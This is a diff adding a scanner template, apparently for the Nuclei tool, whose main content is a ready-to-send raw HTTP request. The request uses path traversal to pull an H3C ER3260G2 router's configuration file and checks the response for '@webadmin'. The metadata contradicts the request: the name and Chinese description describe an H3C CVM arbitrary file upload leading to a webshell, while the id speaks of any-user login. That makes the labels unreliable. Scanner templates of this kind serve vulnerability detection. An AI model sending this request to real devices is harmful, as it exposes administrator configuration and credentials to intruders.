@@ -1,0 +1,31 @@
+id: h3c-ER3260G2-Any-user-login
+
+info:
+  name: H3C CVM - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: H3C CVM 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  tags: h3c,cvm
+
+http:
+  - raw:
+      - |+
+        GET /userLogin.asp/../actionpolicy_status/../ER3260G2.cfg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '@webadmin'
